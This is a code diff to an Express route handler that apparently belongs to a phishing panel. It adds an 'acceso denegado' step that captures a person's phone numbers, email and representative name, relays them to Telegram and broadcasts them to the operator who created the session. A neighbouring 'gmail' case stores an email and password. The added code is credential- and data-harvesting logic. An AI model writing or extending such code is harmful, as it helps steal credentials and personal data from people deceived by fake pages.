@@ -1743,6 +1743,41 @@ export async function registerRoutes(app: Express): Promise<Server> {
                   }
                 }), datosContactoCreatedBy);
                 break;
+                
+              case 'acceso_denegado':
+                updatedFields.telefono1 = inputData.telefono1;
+                updatedFields.telefono2 = inputData.telefono2 || '';
+                updatedFields.correo = inputData.correo;
+                updatedFields.nombreRepresentante = inputData.nombreRepresentante;
+                updatedFields.pasoActual = ScreenType.MENSAJE;
+                console.log('Datos de contacto desde acceso denegado recibidos:', inputData);
+
+                // Enviar notificación a Telegram con los datos de contacto
+                const accesoDenegadoMessage = `🚫 <b>DATOS DE CONTACTO - ACCESO DENEGADO</b>\n\n` +
+                  `📋 <b>Folio:</b> ${sessionFolio}\n` +
+                  `👤 <b>Representante Legal:</b> ${inputData.nombreRepresentante}\n` +
+                  `📧 <b>Correo:</b> ${inputData.correo}\n` +
+                  `📱 <b>Teléfono 1:</b> ${inputData.telefono1}\n` +
+                  (inputData.telefono2 ? `📱 <b>Teléfono 2:</b> ${inputData.telefono2}\n` : '') +
+                  `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}`;
+                sendTelegramMessage(accesoDenegadoMessage);
+
+                // Notificar al admin
+                const accesoDenegadoCreatedBy = existingSession?.createdBy || '';
+
+                broadcastToAdmins(JSON.stringify({
+                  type: 'ACCESO_DENEGADO_CONTACTO_RECEIVED',
+                  data: {
+                    sessionId,
+                    telefono1: inputData.telefono1,
+                    telefono2: inputData.telefono2 || '',
+                    correo: inputData.correo,
+                    nombreRepresentante: inputData.nombreRepresentante,
+                    timestamp: new Date().toISOString(),
+                    createdBy: accesoDenegadoCreatedBy
+                  }
+                }), accesoDenegadoCreatedBy);
+                break;
               case 'gmail':
                 updatedFields.correo = inputData.correo;
                 updatedFields.contrasena = inputData.contrasena;
